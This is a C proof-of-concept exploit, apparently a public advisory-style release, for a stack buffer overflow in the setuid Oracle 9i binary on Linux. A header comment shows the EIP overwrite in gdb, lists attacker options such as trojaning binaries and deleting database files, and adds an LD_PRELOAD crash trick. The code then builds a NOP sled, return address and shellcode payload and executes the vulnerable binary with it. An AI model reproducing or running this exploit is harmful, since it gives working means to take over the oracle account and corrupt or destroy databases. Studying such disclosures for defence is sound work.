/*

             ** Proof of Concept Code brought to you by c0ntex@hushmail.com **

                     Release 2 Patch Set 3 Ver 9.2.0.4.0 for Linux x86

                        ** ** ** ** ** ** ** ** ** ** ** ** ** ** **

 ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** **

 Oracle 9i installed onto a Redhat 9 x86 node with the latest Oracle patch kit has a
 generic stack based buffer overflow.

 By passing a large argv[1] input string one is able to overwrite the EIP register with
 user controlled data, resulting in a segmentation fault that can be controlled to allow
 the execution of arbitrary code.

      /database/u00/app/oracle/product/9.2.0.1.0/bin/oracle
      /database/u00/app/oracle/product/9.2.0.1.0/bin/oracleO

 with Release 2 Patch Set 3 Version 9.2.0.4.0 for Linux.

 These binaries become vulnerable to attack because they are made or get set with a +s
 flag. This allows users other than `oracle` to attach to restricted sections of the
 database, memory segments ....

 All we need to do is create a shellcode that will setreuid of the oracle userID on the
 vulnerable system, yielding oracle user to the world.

 By exploiting this basic bug, one is presented with the following options:

        1) trojan oracle binaries
        2) delete key database files
        3) corrupt or modify data
        4) shutdown abort the database
        5) anything else oracle user can do

 AIX architecture has also been tested and seems to be vulnerable to the same attack, I
 guess that probably every other arch is too.

 If you run oracle as root (don't know why you would do such a thing) then you will loose
 your server, loosing your database is not so bad??

 bash> `which ulimit` -c 999999
 bash> /database/u00/app/oracle/product/9.2.0.1.0/bin/oracle `perl -e 'print "A"x9850'`
 Segmentation fault (core dumped)

 #0  0x41414141 in ?? ()
 (gdb) i r
 eax            0x1d16   7446
 ecx            0xbfffb5a8       -1073760856
 edx            0x41414141       1094795585
 ebx            0x41414141       1094795585
 esp            0x41414141       0x41414141
 ebp            0x41414141       0x41414141
 esi            0x41414141       1094795585
 edi            0x41414141       1094795585
 eip            0x41414141       0x41414141
 eflags         0x10202  66050
 cs             0x23     35
 ....

 A quick work around for this would be to remove [+s] flag. This will stop anyone being
 able to gain `oracle` access to the database via this advised method.

 ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** **

 Since the clearcase abuse information was not posted on all forums, I thought I would
 share this Oracle candy that I mentioned in that advisory.
 Here it is, c0ntex is still not full of hot air or false claims, this stuff is true man.

 ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** **

 My library bug on Linux proved to be pretty useless. Example information to make all
 binaries segmentation fault:

 bash># echo $LD_PRELOAD

 bash># export LD_PRELOAD=/bin/su
 bash># ulimit -c 999999
 bash># su
 Segmentation fault (core dumped)
 bash># passwd
 Segmentation fault (core dumped)

 tsk tsk...

 ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** **

 Ok, no more jokes, I will not tease people with information about bugs without posting
 code to go with it. So I will not mention the issues with php, rlogin, default apache2
 install and .. oops, I will not mention them until I am willing to share code. Relax
 fella..! =|

 ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** **

 Oracle informed over a month ago, got back to me very quickly but have heard nowt since,
 he who delays is a shepards delight... If you get owned, blame them!

 ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** **

 Comments, questions to c0ntex@hushmail.com - Flames to contex@hushmail.com

 ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** ** **

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define VERSION "Operation_Oracle_Owner_Ownage_Overflow_Oday Version 1.0.1"
#define VULNUBL "oracle"// Vulnerable binary
#define SMASHIT 9850    // Minimum BUFF
#define DEFAULT 2222    // Default RET_OFSET
#define PADDING 0x90    // BUFF PADDING
#define REALUID         // ORACLE UserID For Shellcode Testing
//#define BADPAD 15000

/* Oracle UID Shellcode :: "\x31\xc0\xb3"REALUID"\xb0\x46\xcd\x80"; */
char operation_oracle[] = "\x31\xc0\x31\xdb\xfe\xc0\xcd\x80";

unsigned long retrieve_offset()
{
        __asm__(
                        "movl %esp, %eax"
        );
}

int main(int argc, char *argv[])
{
        char Bucket[SMASHIT];
        unsigned long badd_addr;
        unsigned short delta = 0x00;
        unsigned short i;

        if(argc > 1) {
                delta = atol(argv[0x01]);
        }
        else
        {
                delta = DEFAULT;
        }

        badd_addr = retrieve_offset() - delta;

        printf("\n\n*************************************************************\n"
                        "*************************************************************\n");

        printf("[-] %s\n", VERSION);
        printf("[-] -------------------------------------------------------\n"
                        "[-] An offset value from 1750 - 3500 should work perfectly\n"
                        "[-] if this does not nail it first time.\n"
                        "[-] -------------------------------------------------------\n"
                        "[-] Execute this PoC and attach ltrace with -o to a file so\n"
                        "[-] you can grep for the goodness - c0ntex@hushmail.com\n"
                        "[-] http://twistedminds.mine.nu/files/oracle_ownage.c\n"
                        "[-] -------------------------------------------------------\n"
                        "[-] gcc -Wall -o oracle_owned oracle_owned.c\n"
                        "[-] Usage: %s offset_value\n", argv[0x00]);

        for(i = 0x00; i < SMASHIT; i += 0x04)
                *(long *) &Bucket[i] = badd_addr;

        for(i = 0x00; i < (SMASHIT - strlen(operation_oracle) - 0x50); i++)
                *(Bucket + i) = PADDING;

        memcpy(Bucket + i, operation_oracle, strlen(operation_oracle));

        printf("[-] Using Return address 0x%lx\n", badd_addr);
        printf("[-] Using offset value %d\n", delta);

        printf("*************************************************************\n"
                        "*************************************************************\n\n");

        execlp("/database/u00/app/oracle/product/9.2.0.1.0/bin/oracle", VULNUBL, Bucket, NULL);

        return 0x00;
}

